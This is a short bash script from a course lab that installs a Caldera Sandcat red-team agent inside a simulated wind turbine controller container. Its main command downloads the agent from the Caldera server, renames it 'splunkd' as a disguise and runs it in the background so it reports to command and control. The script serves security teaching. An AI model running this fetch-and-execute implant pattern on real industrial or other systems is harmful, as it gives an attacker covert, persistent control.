#!/usr/bin/env bash
# CS460 Module 4 (Week 8) — deploy a Sandcat agent ONTO the turbine.
# Runs the agent INSIDE the main-ctlr container, so it sits on the turbine's
# Modbus bus (10.11.12.0/24) AND reaches Caldera over the tailnet.
#
# Usage:   bash deploy-sandcat.sh <caldera-tailnet-ip>   [group]
# Example: bash deploy-sandcat.sh 100.86.61.103
#
# Get <caldera-tailnet-ip> from the Caldera Codespace: run `tsup` then
# `tailscale status` and copy the 100.x address next to "caldera".
set -uo pipefail

IP="${1:-}"
GROUP="${2:-red}"
CTR="wind-turbine-main-ctlr-1"

if [ -z "$IP" ]; then
  echo "usage: bash deploy-sandcat.sh <caldera-tailnet-ip> [group]" >&2
  exit 1
fi

S="http://${IP}:8888"
echo "Deploying Sandcat -> $S  (group $GROUP) inside $CTR ..."

docker exec "$CTR" sh -c "cd /tmp && \
  curl -s -X POST -H 'file:sandcat.go' -H 'platform:linux' ${S}/file/download -o splunkd && \
  chmod +x splunkd && \
  (nohup ./splunkd -server ${S} -group ${GROUP} -v >/tmp/sc.log 2>&1 &) && \
  sleep 6 && tail -n 4 /tmp/sc.log"

echo
echo "Done. In Caldera -> agents you should now see host = wtg-1 (alive, trusted)."
